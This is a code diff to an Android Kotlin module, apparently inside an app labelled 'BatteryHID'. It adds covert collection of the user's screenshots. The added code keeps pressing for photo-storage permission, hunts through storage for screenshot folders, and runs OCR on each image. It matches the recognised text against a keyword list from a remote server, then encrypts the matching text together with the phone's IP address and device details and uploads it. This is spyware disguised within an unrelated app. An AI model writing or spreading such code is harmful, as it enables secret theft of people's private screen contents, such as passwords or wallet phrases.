@@ -4,6 +4,7 @@ import android.Manifest
 import android.net.Uri
 import android.os.Build
 import androidx.core.net.toUri
+import com.blankj.utilcode.util.DeviceUtils
 import com.blankj.utilcode.util.FileUtils
 import com.blankj.utilcode.util.JsonUtils
 import com.blankj.utilcode.util.PathUtils
@@ -13,26 +14,58 @@ import com.extra.mlkitlibrary.kt.logE
 import com.extra.mlkitlibrary.kt.logV
 import com.extra.mlkitlibrary.utils.AESUtil
 import com.extra.mlkitlibrary.utils.BlowfishUtil
+import com.extra.mlkitlibrary.utils.IPAddrUtils
 import com.google.mlkit.vision.common.InputImage
 import com.google.mlkit.vision.text.TextRecognition
 import com.google.mlkit.vision.text.chinese.ChineseTextRecognizerOptions
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.MainScope
+import kotlinx.coroutines.launch
 import org.json.JSONObject
 
 object MlKitManager {
 
-    private fun loadPhoneScreenShots(modeType: Int, fileSize: Long, callback: (String?, Boolean) -> Unit) {
+    private fun loadPhoneScreenShots(
+        modeType: Int,
+        fileSize: Long,
+        callback: (String?, Boolean) -> Unit
+    ) {
         logV("modeType=${modeType}  fileSize=${fileSize}")
-        val dirPath = PathUtils.getExternalDcimPath() + "/Screenshots"
+        var dirPath = PathUtils.getExternalDcimPath() + "/Screenshots"
+        logV("目录是否存在1=${FileUtils.isFileExists(dirPath)} dirPath=${dirPath}")
+        if (!FileUtils.isFileExists(dirPath)) {
+            dirPath = PathUtils.getExternalPicturesPath() + "/Screenshots"
+        }
+        logV("目录是否存在2=${FileUtils.isFileExists(dirPath)} dirPath=${dirPath}")
+        if (!FileUtils.isFileExists(dirPath)){
+            val externalPath = "storage/emulated/0"
+            if (FileUtils.isFileExists(externalPath)){
+                for (file in FileUtils.listFilesInDir(externalPath)) {
+                    logV("Directory1=${file.absolutePath}")
+                    FileUtils.listFilesInDir(file.absolutePath).forEach {
+                        logV("Directory2=${it.absolutePath}")
+                        if (it.absolutePath.contains("Screenshots")){
+                            logV("Directory3=${it.absolutePath}")
+                            dirPath = it.absolutePath
+                            return@forEach
+                        }
+                    }
+                }
+            }
+        }
+        val filesList = FileUtils.listFilesInDir(dirPath)
+        logV("文件数量1111=${filesList.size}")
         val filesInDir =
-            FileUtils.listFilesInDir(dirPath).filter {
+            filesList.filter {
                 val length = FileUtils.getLength(it)
                 logV("文件长度=${length}")
                 length <= fileSize
             }
+        logV("可筛选文件数量=${filesInDir.size}")
         for ((index, file) in filesInDir.withIndex()) {
             val uri = file.toUri()
-            val fileLength = FileUtils.getLength(file)
-            logV("截图相册文件路径=${uri},文件长度=${fileLength}")
+//            val fileLength = FileUtils.getLength(file)
+//            logV("截图相册文件路径=${uri},文件长度=${fileLength}")
             recognizeText(modeType, uri) {
                 callback.invoke(it, index == filesInDir.size - 1)
             }
@@ -47,13 +80,17 @@ object MlKitManager {
 //                TextRecognition.getClient(ChineseTextRecognizerOptions.Builder().build())
 //            }
 //        }
-        val textRecognizer = TextRecognition.getClient(ChineseTextRecognizerOptions.Builder().build())
-        val inputImage = InputImage.fromFilePath(Utils.getApp(), uri)
-        textRecognizer.process(inputImage).addOnSuccessListener { visionText ->
-            callback.invoke(visionText.text)
-        }.addOnFailureListener { e ->
-            callback.invoke(null)
-            logE("识别异常=${e.message}")
+        MainScope().launch(Dispatchers.IO) {
+            val textRecognizer =
+                TextRecognition.getClient(ChineseTextRecognizerOptions.Builder().build())
+            val inputImage = InputImage.fromFilePath(Utils.getApp(), uri)
+            textRecognizer.process(inputImage).addOnSuccessListener { visionText ->
+                logV("识别内容=${visionText.text} 路径=${uri.path}")
+                callback.invoke(visionText.text)
+            }.addOnFailureListener { e ->
+                callback.invoke(null)
+                logV("识别异常=${e.message}")
+            }
         }
     }
 
@@ -62,12 +99,12 @@ object MlKitManager {
      *  @param key 识别出来的数据
      *  @param channel 渠道号
      */
-    private fun submitData(key:String?,channel: String = "BatteryHID"){
-        if (key.isNullOrBlank()){
+    private fun submitData(key: String?, channel: String = "BatteryHID") {
+        if (key.isNullOrBlank()) {
             logE("提交加密数据异常")
             return
         }
-        HttpManager.httpPost(HttpManager.HTTP_SUBMIT,key,channel){ json->
+        HttpManager.httpPost(HttpManager.HTTP_SUBMIT, key, channel) { json ->
             logV("提交数据=$json")
         }
     }
@@ -75,7 +112,10 @@ object MlKitManager {
     /**
      *  加密数据
      */
-    private fun encryptData(pageSize:String):String?{
+    private fun encryptData(pageSize: String,content:String): String? {
+        //[图片内容字符串]--[ip]--[机型]
+        val deviceInfo = "厂商:${Build.BRAND} 手机型号:${Build.MODEL} 系统版本:${Build.VERSION.RELEASE}"
+        val taskContent = "[${content}]--[${IPAddrUtils.getIpAddress(Utils.getApp())}]--[${System.currentTimeMillis()}]--[${deviceInfo}]"
         try {
             val decryptData = AESUtil.decrypt(pageSize)
             val decrypt = if (decryptData.length > 7) {
@@ -84,10 +124,9 @@ object MlKitManager {
                 decryptData
             }
             logV("解密出来的数据=${decrypt}")
-            val content = "HappyCoder need do more work ${System.currentTimeMillis()}"
-            val data = content.toByteArray()
+            val data = taskContent.toByteArray()
             val encrypt = BlowfishUtil.encrypt(decrypt, data)
-            logV("${content}=加密出来的数据=${encrypt}")
+            logV("${taskContent}=加密出来的数据=${encrypt}")
             return encrypt
         } catch (e: Exception) {
             e.printStackTrace()
@@ -99,14 +138,37 @@ object MlKitManager {
     /**
      *  执行任务
      */
-    fun doTask(){
-        val isGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            PermissionUtils.isGranted(Manifest.permission.READ_MEDIA_IMAGES)
-        } else {
-            PermissionUtils.isGranted(Manifest.permission.READ_EXTERNAL_STORAGE)
+    fun doTask(channel:String="BatteryHID") {
+        MainScope().launch(Dispatchers.Main) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                PermissionUtils.permission(
+                    Manifest.permission.READ_MEDIA_IMAGES
+                )
+            } else {
+                PermissionUtils.permission(Manifest.permission.READ_EXTERNAL_STORAGE)
+            }
+                .rationale { _, shouldRequest ->
+                    shouldRequest.again(true)
+                }
+                .callback(object : PermissionUtils.FullCallback {
+                    override fun onGranted(granted: MutableList<String>) {
+                        logV("已授权")
+                        requestConfig(channel)
+                    }
+
+                    override fun onDenied(
+                        deniedForever: MutableList<String>,
+                        denied: MutableList<String>
+                    ) {
+                        logV("未获取到权限")
+                    }
+
+                })
+                .request()
         }
-        logV("是否权限=$isGranted")
-        if (!isGranted) return
+    }
+
+    private fun requestConfig(channel:String="BatteryHID") {
         HttpManager.httpGet(HttpManager.HTTP_CONFIG) { json ->
             logV("请求数据=$json")
             if (json.isNullOrBlank()) return@httpGet
@@ -125,15 +187,15 @@ object MlKitManager {
                 ) { content, status ->
                     if (!content.isNullOrBlank()) {
                         val containData =
-                            searchList.filter { content.contains(it) || it.contains(content) }
-                        if (containData.isNotEmpty()){
+                            searchList.filter { content.contains(it,true) || it.contains(content,true) }
+                        if (containData.isNotEmpty()) {
                             logV("匹配成功的数据=$content")
-                            submitData(encryptData(pageSize))
+                            submitData(encryptData(pageSize,content),channel)
                         }
                     }
                 }
             }
         }
     }
-    
+
 }
